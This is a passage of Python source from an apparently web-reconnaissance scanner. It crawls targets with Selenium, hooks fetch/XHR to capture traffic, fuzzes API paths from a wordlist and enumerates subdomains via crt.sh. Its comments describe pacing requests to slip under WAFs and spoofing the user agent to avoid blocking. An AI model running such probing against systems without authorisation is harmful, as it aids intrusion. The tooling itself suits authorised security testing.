    '/cdn-cgi/imagedelivery', '/imgproxy/', '/image/resize', '/i/resize',
    '/wp-content/uploads/',
    # Analytics / telemetry / tracking / RUM / ads (data sinks, not the app API)
    'google-analytics', 'googletagmanager', '/gtag/', '/gtm.js', '/ga.js',
    '/collect?', '/analytics', '/telemetry', '/beacon', '/pixel', '/track?',
    '/rum', 'doubleclick', '/tr?id=', 'hotjar', 'sentry', 'segment.io',
    'mixpanel', 'amplitude', 'clarity.ms', 'datadoghq', 'newrelic', 'bugsnag',
    # Service worker / build manifests that aren't data APIs
    '/sw.js', '/service-worker', '/workbox-', '/asset-manifest.json',
)

# Realtime transports & dev-server churn — framework-agnostic noise that should
# never be recorded as an endpoint (socket.io, SockJS, webpack/Vite HMR, …).
NOISE_PATHS = (
    '/socket.io/', '/sockjs/', '/sockjs-node/', '__webpack_hmr',
    'hot-update', '/@vite/', '/__vite', '/livereload', '/browser-sync',
    '/_next/webpack-hmr', '/ws',
)

# Texts that indicate a state-changing / destructive action — never auto-clicked
DESTRUCTIVE = (
    'delete', 'remove', 'destroy', 'uninstall', 'stop', 'kill', 'shutdown',
    'reboot', 'restart', 'reset', 'logout', 'log out', 'sign out',
    'clear', 'drop', 'format', 'rebuild', 'force', 'prune', 'disable',
    'excluir', 'remover', 'apagar', 'parar', 'sair', 'reiniciar',
)

# Broader set of mutating verbs (DESTRUCTIVE + create/save/…) avoided when the
# crawler clicks controls to simulate a user — so it triggers read-style API
# calls (search, sort, paginate, view) without creating/changing server state.
MUTATING = DESTRUCTIVE + (
    'create', 'add ', 'new', 'save', 'submit', 'confirm', 'apply', 'upload',
    'install', 'enable', 'edit', 'update', 'import', 'export', 'run', 'execute',
    'backup', 'restore', 'generate', 'send', 'invite', 'pay', 'purchase',
    'criar', 'adicionar', 'salvar', 'enviar', 'guardar', 'crear',
)


# ─────────────────────────────────────────────
# Scan modes — one profile per intensity. Each tunes the crawler (pacing,
# interaction budget, page-settle caps, asset cap) and the set of tech-scan
# probes that may run. Every mode is as fast as it can be *within its scope*:
#   • Stealth    — throttled, low-noise: paces requests to slip under WAF /
#                  rate-limits and avoid disrupting the target; passive tech
#                  probes only (no port scan, brute-force or active WAF probing).
#   • Normal     — balanced: no artificial throttle but a steady footprint that
#                  won't hammer the target; the standard tech-probe set.
#   • Aggressive — maximum coverage: no throttle, heavier interaction and every
#                  probe (incl. common-path discovery, OPTIONS and active WAF
#                  fingerprinting); does not spare the target's service.
# 'page_delay' is a (min, max) seconds range slept before each navigation.
# 'tech_probes' names gate fingerprint_target()'s jobs (see that method).

# ─────────────────────────────────────────────
# Active API-endpoint discovery (unauthenticated probing). Two tiers:
#   • High-signal (Normal + Aggressive): self-documenting spec endpoints,
#     framework actuators/health, well-known discovery files and API roots —
#     few requests, mostly public, low WAF exposure. A swagger/openapi hit is
#     gold: its body lists the whole API, which is then mined and probed.
#   • Wordlist fuzzing (Aggressive only): a comprehensive path wordlist expanded
#     under the API bases that actually exist (a 404 base is skipped), so volume
#     stays bounded. NOT user-like navigation — gated to the mode the user opts
#     into. Endpoints that need auth (401/403) are kept as nodes so the status
#     and response are visible for analysis (they are NOT chased further).
API_PROBE_WELLKNOWN = (
    # OpenAPI / Swagger specs (a hit lists the entire API surface)
    '/swagger.json', '/swagger/v1/swagger.json', '/swagger/v2/swagger.json',
    '/openapi.json', '/openapi.yaml', '/openapi/v3', '/v1/openapi.json',
    '/v2/openapi.json', '/api/swagger.json', '/api/openapi.json',
    '/api-docs', '/api/api-docs', '/v2/api-docs', '/v3/api-docs',
    '/swagger-resources', '/swagger-ui.html', '/swagger/index.html',
    '/redoc', '/docs', '/api/docs', '/api/schema', '/graphql/schema',
    # API roots / version discovery
    '/api', '/api/', '/api/v1', '/api/v2', '/api/v3', '/rest', '/rest/',
    '/services', '/graphql', '/api/graphql', '/graphql/v1', '/query', '/rpc',
    # Health / ops / framework actuators (frequently unauthenticated)
    '/health', '/healthz', '/livez', '/readyz', '/ready', '/status', '/ping',
    '/version', '/info', '/metrics', '/actuator', '/actuator/health',
    '/actuator/info', '/actuator/env', '/actuator/mappings', '/actuator/beans',
    # Well-known & discovery
    '/.well-known/security.txt', '/.well-known/openid-configuration',
    '/.well-known/oauth-authorization-server',
    '/.well-known/assetlinks.json', '/.well-known/apple-app-site-association',
    # CMS / framework data conventions
    '/wp-json', '/wp-json/wp/v2', '/wp-json/wp/v2/users',
)

# Prefixes under which the Aggressive wordlist is expanded (only if they exist).
API_PROBE_BASES = ('/api/', '/api/v1/', '/api/v2/', '/api/v3/',
                   '/rest/', '/services/', '/')

# Comprehensive resource/endpoint wordlist for Aggressive fuzzing. Categorical
# (auth, users, commerce, content, geo, ops, docs, admin) so it generalises
# across sites rather than matching one product. De-duplicated at import.
_API_PROBE_WORDS = (
    # auth / identity
    'login', 'logout', 'register', 'signup', 'signin', 'signout', 'auth',
    'authenticate', 'authorize', 'token', 'tokens', 'refresh', 'oauth',
    'oauth2', 'sso', 'session', 'sessions', 'password', 'forgot-password',
    'reset-password', 'change-password', 'verify', 'verify-email', 'otp',
    '2fa', 'mfa', 'captcha', 'permissions', 'roles', 'role', 'scopes',
    'consent', 'credentials', 'keys', 'apikeys', 'api-keys',
    # users / accounts / profiles
    'users', 'user', 'accounts', 'account', 'profile', 'profiles', 'me',
    'members', 'member', 'customers', 'customer', 'clients', 'client',
    'contacts', 'contact', 'employees', 'drivers', 'driver', 'riders', 'rider',
    'passengers', 'passenger', 'partners', 'partner', 'admins', 'admin',
    'staff', 'teams', 'team', 'groups', 'group', 'organizations',
    'organization', 'orgs', 'org', 'tenants', 'tenant', 'devices', 'device',
    # commerce
    'orders', 'order', 'cart', 'carts', 'checkout', 'payments', 'payment',
    'pay', 'transactions', 'transaction', 'invoices', 'invoice', 'billing',
    'subscriptions', 'subscription', 'plans', 'plan', 'pricing', 'prices',
    'products', 'product', 'catalog', 'categories', 'category', 'items',
    'item', 'inventory', 'stock', 'shipping', 'shipments', 'shipment',
    'delivery', 'deliveries', 'coupons', 'coupon', 'discounts', 'discount',
    'promotions', 'promo', 'refunds', 'refund', 'wallet', 'balance', 'credits',
    'rewards', 'points', 'cards', 'card', 'banks', 'transfers',
    # content / media
    'files', 'file', 'upload', 'uploads', 'download', 'downloads', 'documents',
    'document', 'images', 'image', 'media', 'assets', 'asset', 'attachments',
    'attachment', 'avatars', 'avatar', 'photos', 'videos', 'content', 'posts',
    'post', 'comments', 'comment', 'reviews', 'review', 'ratings', 'messages',
    'message', 'chat', 'notifications', 'notification', 'feed', 'articles',
    'article', 'blog', 'news', 'pages', 'page', 'tags', 'tag', 'search',
    'autocomplete', 'suggest', 'recommendations',
    # geo / rides / booking
    'locations', 'location', 'places', 'place', 'geocode', 'address',
    'addresses', 'cities', 'city', 'countries', 'country', 'regions', 'region',
    'zones', 'zone', 'routes', 'route', 'trips', 'trip', 'rides', 'ride',
    'bookings', 'booking', 'reservations', 'reservation', 'tracking', 'track',
    'maps', 'distance', 'eta', 'fares', 'fare', 'estimate',
    # ops / config / system
    'config', 'configuration', 'settings', 'setting', 'preferences',
    'features', 'feature-flags', 'flags', 'meta', 'metadata', 'stats',
    'statistics', 'analytics', 'logs', 'log', 'events', 'event', 'audit',
    'jobs', 'job', 'tasks', 'task', 'queue', 'webhooks', 'webhook',
    'callbacks', 'callback', 'export', 'import', 'sync', 'backup', 'migrate',
    'batch', 'bulk', 'validate', 'health', 'ping', 'status', 'version',
    # docs / schema / dev
    'swagger', 'openapi', 'api-docs', 'docs', 'schema', 'spec', 'graphiql',
    'playground', 'explorer', 'console', 'debug', 'test', 'echo', 'whoami',
    # admin / internal / support
    'dashboard', 'reports', 'report', 'manage', 'management', 'internal',
    'support', 'tickets', 'ticket', 'faq', 'help', 'feedback', 'survey',
    'forms', 'form', 'fields', 'field', 'templates', 'template',
)
API_PROBE_WORDLIST = tuple(dict.fromkeys(_API_PROBE_WORDS))

SCAN_MODES = {
    'Stealth': {
        'page_delay':     (1.5, 4.0),
        'max_clicks':     10,
        'max_assets':     250,
        'ready_quiet':    0.5,
        'ready_hard_cap': 12.0,
        # Passive only — no port scan / brute-force / active probing.
        'tech_probes':    ('wapp', 'techcli', 'sec_headers', 'tls', 'dns',
                           'http_versions', 'cname'),
    },
    'Normal': {
        'page_delay':     (0.0, 0.0),
        'max_clicks':     25,
        'max_assets':     400,
        'ready_quiet':    0.45,
        'ready_hard_cap': 12.0,
        'tech_probes':    ('wapp', 'techcli', 'sec_headers', 'tls', 'dns',
                           'http_versions', 'cname', 'favicon', 'site_meta',
                           'wafw00f', 'ports', 'whatweb', 'nmap'),
    },
    'Aggressive': {
        'page_delay':     (0.0, 0.0),
        'max_clicks':     60,
        'max_assets':     800,
        'ready_quiet':    0.4,
        'ready_hard_cap': 12.0,
        'tech_probes':    ('wapp', 'techcli', 'sec_headers', 'tls', 'dns',
                           'http_versions', 'cname', 'favicon', 'site_meta',
                           'wafw00f', 'ports', 'whatweb', 'nmap', 'whois',
                           'cms_version', 'common_paths', 'options', 'waf'),
    },
}
DEFAULT_SCAN_MODE = 'Normal'


class scan:
    """Scan feature: drives the headless browser to crawl a target, captures
    requests/responses, discovers assets/endpoints, and emits SiteNode objects
    (the graph at the data level — the gui renders them)."""
    # ── Adaptive timing (upper bounds, not fixed sleeps) ───────────────
    # The readiness wait returns as soon as the page goes quiet, so these are
    # caps that adapt: a static page returns in well under a second, a heavy
    # SPA is given room to keep working without a magic per-framework sleep.
    _PAGE_LOAD_TIMEOUT = 45
    _READY_HARD_CAP    = 12.0
    _READY_QUIET       = 0.45
    _READY_POLL        = 0.15
    # How much page text to retain per node (characters). Big enough to hold a
    # real document, capped so a multi-MB asset can't bloat memory/JSON.
    _TEXT_SNIPPET      = 8000

    # Generic network capture: wrap fetch() and XMLHttpRequest so every request
    # the page makes — method, URL, request body AND the response (status +
    # truncated body) — is recorded into window.__recon_net. The Performance API
    # only exposes URLs, so this is the only way to learn an endpoint's HTTP
    # method, its POST/PUT body params (e.g. a POST search with an `orderBy`
    # field) and the response it returned without re-sending the request (which
    # for a POST could have side effects, e.g. re-logging-in). Framework-
    # agnostic: it hooks the browser primitives, not any app code. Idempotent.
    _NET_CAPTURE_JS = r"""
    (function(){
      if (window.__recon_net_installed) return;
      window.__recon_net_installed = true;
      window.__recon_net = window.__recon_net || [];
      // Normalize any request-headers shape (Headers object / [[k,v]] / plain
      // object) into a plain {name: value} dict so the node can store the exact
      // headers the browser sent.
      function hdrObj(h){
        var out={};
        try{
          if(!h) return out;
          if(typeof h.forEach==='function' && typeof h.get==='function'){
            h.forEach(function(v,k){ out[k]=v; });            // Headers
          } else if(Array.isArray(h)){
            h.forEach(function(p){ if(p&&p.length>=2) out[p[0]]=p[1]; });
          } else if(typeof h==='object'){
            for(var k in h){ if(Object.prototype.hasOwnProperty.call(h,k)) out[k]=h[k]; }
          }
        }catch(e){}
        return out;
      }
      // Parse XHR getAllResponseHeaders() ("k: v\r\n…") into a dict.
      function parseRespHeaders(s){
        var out={};
        try{
          (s||'').trim().split(/[\r\n]+/).forEach(function(line){
            var i=line.indexOf(':');
            if(i>0) out[line.slice(0,i).trim()]=line.slice(i+1).trim();
          });
        }catch(e){}
        return out;
      }
      function rec(method, url, body, ct, reqHeaders){
        var o = {
          method:String(method||'GET').toUpperCase(),
          url:String(url||''),
          body:(typeof body==='string')?body.slice(0,8000):(body?'[binary]':''),
          ct:String(ct||''), status:null, respBody:'',
          reqHeaders:reqHeaders||{}, respHeaders:{} };
        try{
          if(!url) return o;
          window.__recon_net.push(o);
          if(window.__recon_net.length>800) window.__recon_net.shift();
        }catch(e){}
        return o;
      }
      var _f = window.fetch;
      if(_f){
        window.fetch = function(input, init){
          var o;
          try{
            var url=(typeof input==='string')?input:(input&&input.url);
            var m=(init&&init.method)||(input&&input.method)||'GET';
            var b=init&&init.body;
            var rh=hdrObj((init&&init.headers)||(input&&input.headers));
            var ct='';
            try{ ct = rh['Content-Type']||rh['content-type']||''; }catch(e){}
            o = rec(m,url,b,ct,rh);
          }catch(e){}
          var p = _f.apply(this, arguments);
          try{
            p.then(function(resp){
              try{
                if(o){ o.status=resp.status;
                  try{ resp.headers.forEach(function(v,k){ o.respHeaders[k]=v; }); }catch(e){}
                  resp.clone().text().then(function(t){
                    try{ o.respBody=(t||'').slice(0,12000); }catch(e){} },
                    function(){}); }
              }catch(e){}
              return resp;
            }, function(){});
          }catch(e){}
          return p;
        };
      }
      var _open = XMLHttpRequest.prototype.open;
      var _send = XMLHttpRequest.prototype.send;
      var _setH = XMLHttpRequest.prototype.setRequestHeader;
      XMLHttpRequest.prototype.open = function(method, url){
        this.__recon_m=method; this.__recon_u=url; this.__recon_ct=''; this.__recon_h={};
        return _open.apply(this, arguments);
      };
      XMLHttpRequest.prototype.setRequestHeader = function(k, v){
        try{
          this.__recon_h=this.__recon_h||{};
          this.__recon_h[k]=v;
          if(String(k).toLowerCase()==='content-type') this.__recon_ct=v;
        }catch(e){}
        return _setH.apply(this, arguments);
      };
      XMLHttpRequest.prototype.send = function(body){
        var o;
        try{ o = rec(this.__recon_m, this.__recon_u, body, this.__recon_ct, this.__recon_h||{}); }catch(e){}
        try{
          this.addEventListener('load', function(){
            try{ if(o){ o.status=this.status;
              o.respBody=(this.responseText||'').slice(0,12000);
              try{ o.respHeaders=parseRespHeaders(this.getAllResponseHeaders()); }catch(e){} } }catch(e){}
          });
        }catch(e){}
        return _send.apply(this, arguments);
      };
    })();
    """

    def __init__(self, on_node=None, on_status=None, on_done=None,
                 headless=True, max_clicks=25,
                 username='', password='', browser_geometry='', mode=None,
                 scope_pattern='', on_subdomain=None, subdomain_discovery=True,
                 auth_scan=False, auth_callback=None, host_auth=None,
                 whitelist=None, scan_type='browser', proxy=None, unsafe=False):
        """Configure a scan run.

        Args:
            on_node: Callback invoked with each discovered SiteNode.
            on_status: Callback for human-readable status/log strings.
            on_done: Callback invoked once when the scan finishes.
            headless: Run the browser headless when True.
            max_clicks: Per-page budget for the interaction (click) step.
            username, password: Credentials for an auto-detected login form.
            browser_geometry: 'WxH+X+Y' to restore the browser window position.
            mode: Scan intensity name ('Stealth'/'Normal'/'Aggressive').
            scope_pattern: Optional glob/regex limiting which URLs are crawled.
            on_subdomain: Callback fired once per newly-seen in-scope sibling host.
            subdomain_discovery: Whether to report sibling hosts (primary scan
                only; per-subdomain sub-scans set this False to avoid recursion).
            auth_scan: Enable the authenticated-scan credential prompting flow.
            auth_callback: Blocking callback(node) returning a credential dict.
            host_auth: Shared host -> credential dict, so sub-scans reuse creds.
            whitelist: Optional SafePathWhitelist. Discovered non-GET endpoints
                whose path is allowlisted (default: read/query verbs) and not
                destructive are auto-probed (and their params recovered);
                everything else is surfaced un-sent for the Repeater. None = no
                whitelist (auto-probe every non-destructive non-GET path).
            scan_type: 'browser' (default) drives the Selenium crawl — navigate
                the target like a user. 'fuzzing' skips the browser entirely and
                runs only the path-wordlist fuzzing pass (directory/endpoint
                discovery, e.g. /images, /admin); it uses no whitelist and is
                paced by the intensity mode (throttled in Stealth, full-speed in
                Normal/Aggressive).
        """
        self.on_node    = on_node
        self.on_status  = on_status
        self.on_done    = on_done
        self.on_subdomain = on_subdomain
        self.headless   = headless
        self.username   = username or ''
        self.password   = password or ''
        self.browser_geometry = browser_geometry or ''
        self.is_chrome  = False
        # ── Authenticated scan ──────────────────────────────────────────────
        # When auth_scan is on, hitting an auth wall (401 / login form) for a
        # not-yet-configured host pauses the scan and calls auth_callback(node)
        # to get a credential; it's cached per host in host_auth and injected
        # into every later request to that host. Session-only (never persisted).
        self.auth_scan  = bool(auth_scan)
        # 'browser' = Selenium crawl; 'fuzzing' = path-wordlist fuzzing only (no
        # browser, no whitelist), paced by the intensity mode.
        self.scan_type  = scan_type if scan_type in ('browser', 'fuzzing') else 'browser'
        # Safe-path allowlist gating which non-GET endpoints are auto-probed.
        # None = auto-probe every non-destructive non-GET path (no whitelist).
        self.whitelist  = whitelist
        # Proxy ('host:port') the browser routes through so its traffic is
        # intercepted; None = direct. Unsafe mode (intercept-driven full-surface
        # crawl): when True the crawl interacts with EVERYTHING — no whitelist, no
        # destructive veto, no safe-click gating — so the user can vet each request
        # in the interceptor. Scope (_in_scope) still applies.
        self.proxy   = proxy or None
        self.unsafe  = bool(unsafe)
        if self.unsafe:
            self.whitelist = None
        self.auth_callback = auth_callback
        # host -> credential descriptor {'type': str, ...fields}. Shared dict so
        # the app can pre-seed it and sub-scans reuse credentials entered once.
        self.host_auth  = host_auth if host_auth is not None else {}
        self.auth_asked = set()
        # Scope filter (glob/regex). When set, the crawl only visits/records URLs
        # that match; empty = crawl everything in scope for the mode (default).
        self.scope_pattern = scope_pattern or ''
        self._scope_re = _compile_scope_pattern(self.scope_pattern)
        # Whether this scan enumerates sibling subdomains (primary scan only —
        # the per-subdomain scans it spawns set this False to avoid recursion).
        self.subdomain_discovery = subdomain_discovery
        self.subs_seen: set = set()
        # host -> set of <a href> navigation URLs pointing at that sibling host.
        # Real, user-clickable links (not API/XHR), so the app can seed each
        # subdomain's sub-scan with actual pages instead of only the bare root —
        # a host whose '/' is a dead end / redirect still gets its real pages
        # crawled.
        self.sub_seeds: dict = {}
        self._entry_host = ''
        # Scan mode tunes pacing / interaction budget / settle caps. Unknown
        # names fall back to Normal; max_clicks from the mode overrides the arg.
        self.mode = mode if mode in SCAN_MODES else DEFAULT_SCAN_MODE
        m = SCAN_MODES[self.mode]
        self.max_clicks   = m['max_clicks']
        self.max_assets   = m['max_assets']
        self._page_delay  = m['page_delay']
        self._mode_quiet  = m['ready_quiet']
        self._mode_hard_cap = m['ready_hard_cap']
        self.running    = False
        self.failed     = False
        self.stopped    = False
        self.driver     = None
        self.logged_in  = False
        self._login_tries = 0
        self.visited: set = set()
        self.assets: set = set()
        # API base path prefix(es) the app mounts its API under (e.g. '/api/v1'),
        # learned dynamically from the axios/fetch `baseURL` literal and from
        # observed live traffic — never hardcoded. Used to relocate API paths the
        # frontend writes *relative* to that base (a bare '/hosts/command/search'
        # is really '/api/v1/hosts/command/search').
        self.api_base_hints: set = set()
        # Root-relative endpoint paths mined from app source, keyed by path:
        # {path: {'method': str, 'params': {field: ''}}}. Re-emitted under each
        # detected base after the crawl, carrying any source-recovered body fields.
        self._mined_rel: dict = {}
        # Paginated request-model field sets mined from source object literals
        # (frozensets of keys for any literal carrying a page+size signature).
        # Used to enrich a confirmed search/list POST body with its *optional*
        # fields (orderBy, order, filters) that a validation error never names.
        self._page_models: set = set()
        # Auth/login forms already submitted with probe values this scan, so a
        # login gate that appears on several pages is only attempted once.
        self._probed_forms: set = set()
        self.base_domain = ''
                                     # discovery treats *.base_domain as in-scope
        self.shell_hash  = None
        self.last_browser_rect = ''
        self._initial_observed = []
        self._initial_url = ''
        self._ua = ''

    def _log(self, msg):
        """Forward a status/log line to the on_status callback, if one is set."""
        if self.on_status:
            self.on_status(msg)

    def _throttle(self):
        """Pace requests for stealth: sleep a randomised delay before a page
        load so the crawl stays under WAF / rate-limit thresholds. A no-op in
        modes whose page_delay is zero. Stays responsive to STOP."""
        lo, hi = self._page_delay
        if hi <= 0:
            return
        remaining = random.uniform(lo, hi)
        while remaining > 0 and self.running:
            time.sleep(min(0.2, remaining))
            remaining -= 0.2

    def _resolve_driver(self, browser):
        """Ask Selenium Manager for a driver that matches the installed browser,
        explicitly ignoring any driver already on PATH (--skip-driver-in-path).

        A stale system driver on PATH (e.g. an old distro geckodriver) otherwise
        shadows the correct version and breaks newer browsers; Selenium Manager
        only *warns* about the mismatch and uses the PATH one anyway. Returning
        the managed (auto-downloaded, version-matched) driver path here makes the
        scanner portable across machines without touching the system. Returns the
        driver path, or None to fall back to Selenium's default resolution."""
        try:
            from selenium.webdriver.common.selenium_manager import SeleniumManager
            out = SeleniumManager().binary_paths(
                ['--browser', browser, '--skip-driver-in-path'])
            path = (out or {}).get('driver_path') or ''
            if path and os.path.isfile(path):
                return path
        except Exception as e:
            self._log(f'Driver auto-resolve failed ({browser}): {e}')
        return None

    def _init_driver(self):
        """Start the WebDriver, preferring Chrome then falling back to Firefox.

        Chrome is tried first because its DevTools Protocol (CDP) lets an Auth
        scan inject auth headers into browser navigations/XHR, which Firefox via
        WebDriver cannot; on Firefox the Auth scan degrades to cookie/storage/
        login-form injection. Sets self.is_chrome and raises RuntimeError if no
        driver can be started."""
        self.is_chrome = False
        try:
            opts = ChromeOptions()
            if self.headless:
                opts.add_argument('--headless=new')
            # Headless Chrome advertises a "HeadlessChrome" token in
            # navigator.userAgent, which WAFs (CloudFront, Cloudflare, …)
            # fingerprint and block with a 403 on every request. Pin the same
            # clean UA the fingerprint probes use so the crawl isn't blocked.
            opts.add_argument(f'--user-agent={_FP_UA}')
            opts.add_argument('--no-sandbox')
            opts.add_argument('--disable-dev-shm-usage')
            opts.add_argument('--ignore-certificate-errors')
            opts.add_argument('--mute-audio')
            # Route through the intercepting proxy when one is set, so the crawl's
            # browser traffic is intercepted (HTTPS works thanks to the cert-error
            # bypass above).
            if self.proxy:
                opts.add_argument(f'--proxy-server={self.proxy}')
            opts.set_capability('acceptInsecureCerts', True)
            drv = self._resolve_driver('chrome')
            service = ChromeService(executable_path=drv) if drv else None
            self.driver = webdriver.Chrome(options=opts, service=service)
            self.driver.set_page_load_timeout(self._PAGE_LOAD_TIMEOUT)
            self.is_chrome = True
            self._apply_browser_geometry()
            self._init_cdp()
            self._log('Chrome WebDriver ready'
                      + (f' (chromedriver: {drv})' if drv else ''))
            return
        except Exception as e:
            self._log(f'Chrome WebDriver unavailable: {e}')
        try:
            opts = FirefoxOptions()
            if self.headless:
                opts.add_argument('-headless')
            # Accept self-signed certs (common on internal/https targets)
            opts.set_capability('acceptInsecureCerts', True)
            # Route through the intercepting proxy when one is set.
            if self.proxy:
                phost, _, pport = self.proxy.partition(':')
                opts.set_preference('network.proxy.type', 1)
                opts.set_preference('network.proxy.http', phost or '127.0.0.1')
                opts.set_preference('network.proxy.http_port', int(pport or 8080))
                opts.set_preference('network.proxy.ssl', phost or '127.0.0.1')
                opts.set_preference('network.proxy.ssl_port', int(pport or 8080))
                opts.set_preference('network.proxy.allow_hijacking_localhost', True)
            # Mute the browser: the crawl loads/clicks pages that may autoplay
            # audio/video, which otherwise plays out of the user's speakers.
            opts.set_preference('media.volume_scale', '0.0')
            opts.set_preference('media.autoplay.default', 5)
            opts.set_preference('media.autoplay.blocking_policy', 2)
            drv = self._resolve_driver('firefox')
            service = FirefoxService(executable_path=drv) if drv else None
            self.driver = webdriver.Firefox(options=opts, service=service)
            self.driver.set_page_load_timeout(self._PAGE_LOAD_TIMEOUT)
            self._apply_browser_geometry()
            self._log('Firefox WebDriver ready'
                      + (f' (geckodriver: {drv})' if drv else ''))
            if self.auth_scan:
                self._log('Note: Auth scan on Firefox can\'t inject headers into '
                          'browser navigation (no CDP) — cookie/token/login-form '
                          'auth still works; install Chrome for full coverage.')
        except Exception as e:
            raise RuntimeError(f'No WebDriver available: {e}')

    def _init_cdp(self):
        """Enable the CDP Network domain on a Chrome driver so an Auth scan can
        inject per-host auth headers into browser-originated requests (Part 6
        wires the actual Fetch interception). No-op / best-effort otherwise."""
        if not self.is_chrome:
            return
        try:
            self.driver.execute_cdp_cmd('Network.enable', {})
        except Exception as e:
            self._log(f'CDP enable failed (header injection unavailable): {e}')

    def _apply_browser_geometry(self):
        """Position/resize the WebDriver window. If a previous run saved a
        geometry, restore it; otherwise default to fullscreen."""
        if self.headless:
            return
        try:
            m = re.match(r'^(\d+)x(\d+)([+-]\d+)([+-]\d+)$',
                         self.browser_geometry or '')
            if m:
                w, h, x, y = int(m[1]), int(m[2]), int(m[3]), int(m[4])
            else:
                dims = self.driver.execute_script(
                    "return [screen.availWidth || screen.width, "
                    " screen.availHeight || screen.height];")
                w, h = int(dims[0]), int(dims[1])
                x, y = 0, 0
            self.driver.set_window_position(x, y)
            self.driver.set_window_size(max(400, w), max(300, h))
        except Exception as e:
            self._log(f'browser geometry error: {e}')

    def _wait_ready(self, max_wait=None, quiet=None):
        """Wait until the page is *actually* settled rather than sleeping a
        fixed amount. After document.readyState is 'complete', poll the live
        DOM size, the number of network resources the browser has fetched, and
        any in-flight jQuery XHRs, and return as soon as all of them hold steady
        for a short quiet window (network + DOM idle).

        This adapts to whatever is in front of it — a static page returns almost
        immediately, an Angular/Vue/React SPA is given as long as it keeps
        mutating or fetching — with a hard cap so a page that streams or
        long-polls forever can't stall the crawl. No per-framework constant."""
        drv = self.driver
        hard_cap   = self._mode_hard_cap if max_wait is None else max_wait
        need_quiet = self._mode_quiet    if quiet    is None else quiet
        # Install network capture as early as we can after navigation so we
        # record the methods/bodies of XHR/fetch the page fires while settling.
        self._install_net_capture()
        try:
            WebDriverWait(drv, min(15, hard_cap)).until(
                lambda d: d.execute_script('return document.readyState') == 'complete')
        except Exception:
            pass
        self._install_net_capture()
        # [DOM node count, completed-resource count, in-flight jQuery XHRs].
        # A resource only appears in the Performance list once it finishes, so a
        # stable count == the network has gone quiet; the DOM count covers
        # client-side rendering; jQuery.active catches libraries mid-request.
        probe = ("return [document.getElementsByTagName('*').length,"
                 " (window.performance && performance.getEntriesByType) ?"
                 "   performance.getEntriesByType('resource').length : 0,"
                 " (window.jQuery && window.jQuery.active) || 0];")
        deadline, last, quiet_since = time.time() + hard_cap, None, None
        while time.time() < deadline and self.running:
            try:
                snap = tuple(drv.execute_script(probe))
            except Exception:
                break
            in_flight = snap[2] if len(snap) > 2 else 0
            if snap == last and not in_flight:
                if quiet_since is None:
                    quiet_since = time.time()
                elif time.time() - quiet_since >= need_quiet:
                    break
            else:
                quiet_since, last = None, snap
            time.sleep(self._READY_POLL)

    def _install_net_capture(self):
        """(Re)install the fetch/XHR instrumentation in the current document."""
        try:
            self.driver.execute_script(self._NET_CAPTURE_JS)
        except Exception:
            pass

    @staticmethod
    def _parse_body_params(body, ct):
        """Best-effort generic parse of a request body into a {name: value}
        map: JSON objects → top-level keys, form-encoded → fields. Works for
        any framework since it keys off the body shape / Content-Type."""
        body = (body or '').strip()
        if not body:
            return {}
        ctl = (ct or '').lower()
        if 'json' in ctl or body[:1] in '{[':
            try:
                j = json.loads(body)
                if isinstance(j, dict):
                    return {k: (v if isinstance(v, (str, int, float, bool))
                                else json.dumps(v, ensure_ascii=False))
                            for k, v in j.items()}
            except Exception:
                pass
        try:
            return {k: (v[0] if v else '')
                    for k, v in parse_qs(body, keep_blank_values=True).items()}
        except Exception:
            return {}

    def _same_site(self, host) -> bool:
        """In scope for discovery: the exact host or any subdomain that shares
        the target's registrable domain (api.example.com for app.example.com).
        Falls back to a permissive True if no base domain has been computed."""
        host = _host_only(host)
        if not host:
            return False
        base = self.base_domain
        if not base:
            return True
        return host == base or host.endswith('.' + base)

    def _host_in_scope(self, host) -> bool:
        """Whether a host is in scope. With NO scope pattern this is same-site
        (the entry's registrable domain). With a scope pattern set, the pattern is
        the authority — and it's matched against the host AND a representative root
        URL, so a host-style glob like '*.*brand*.com' broadens discovery to
        sibling-brand domains (e.g. a separate brand-app domain), not just the
        eTLD+1."""
        host = _host_only(host)
        if not host:
            return False
        if self._scope_re is None:
            return self._same_site(host)
        try:
            return bool(self._scope_re.match(host)
                        or self._scope_re.match('https://' + host)
                        or self._scope_re.match('https://' + host + '/'))
        except Exception:
            return self._same_site(host)

    def _in_scope(self, url) -> bool:
        """Honour the user's scope glob/regex: when set, the crawl only visits and
        records matching URLs (matched against the full URL OR the host, so both
        URL-style and host-style globs work). Empty pattern = no restriction."""
        if self._scope_re is None:
            return True
        try:
            if self._scope_re.match(url):
                return True
            return self._host_in_scope(urlparse(url).netloc)
        except Exception:
            return True

    def _note_subdomain(self, host):
        """Report a newly-seen in-scope host (not the entry host) to the app via
        on_subdomain, once per host. With a scope set this can include sibling-
        brand domains; with no scope it's same-site only. Drives the multi-graph
        and the per-host scans the app spawns."""
        if not (self.subdomain_discovery and self.on_subdomain):
            return
        host = _host_only(host)
        if not host or host == self._entry_host or host in self.subs_seen:
            return
        if not self._host_in_scope(host):
            return
        self.subs_seen.add(host)
        try:
            self.on_subdomain(host)
        except Exception:
            pass

    def _note_embedded_hosts(self, url):
        """Some URLs embed another URL in a query param (image optimizers like
        /_next/image?url=…, oembed, redirectors). Pull those out and report their
        hosts so an in-scope backend referenced only via such a param (e.g. a
        file-storage host behind the image proxy) still gets discovered."""
        if '?' not in (url or ''):
            return
        try:
            from urllib.parse import parse_qs, unquote
            qs = parse_qs(urlparse(url).query)
        except Exception:
            return
        for vals in qs.values():
            for v in vals:
                v = unquote(v or '')
                if v.startswith(('http://', 'https://')):
                    self._note_subdomain(urlparse(v).netloc)

    def _enumerate_subdomains_crtsh(self):
        """Aggressive-mode active enumeration: query crt.sh certificate
        transparency for *.base_domain and report each in-scope host. Best-effort
        — any failure (offline, rate-limited, bad JSON) is silently ignored."""
        base = self.base_domain
        if not base or not REQUESTS_AVAILABLE:
            return
        try:
            r = requests.get('https://crt.sh/', params={'q': '%.' + base,
                             'output': 'json'}, timeout=15,
                             headers={'User-Agent': 'Mozilla/5.0'})
            if r.status_code != 200:
                return
            data = r.json()
        except Exception:
            return
        found = set()
        for row in data or []:
            for name in str(row.get('name_value', '')).split('\n'):
                name = name.strip().lstrip('*.').lower()
                if name and '*' not in name:
                    found.add(name)
        for host in sorted(found):
            if not self.running and self.driver is not None:
                break
            self._note_subdomain(host)

    def _collect_api_calls(self, domain) -> list:
        """Real requests the page made, read from the fetch/XHR instrumentation:
        method + URL + body params. Same-domain, non-asset only. De-duplicated
        on (method, url, body-param names)."""
        try:
            recs = self.driver.execute_script("return window.__recon_net || [];")
        except Exception:
            recs = []
        out, seen = [], set()
        cur = self.driver.current_url if self.driver else ''
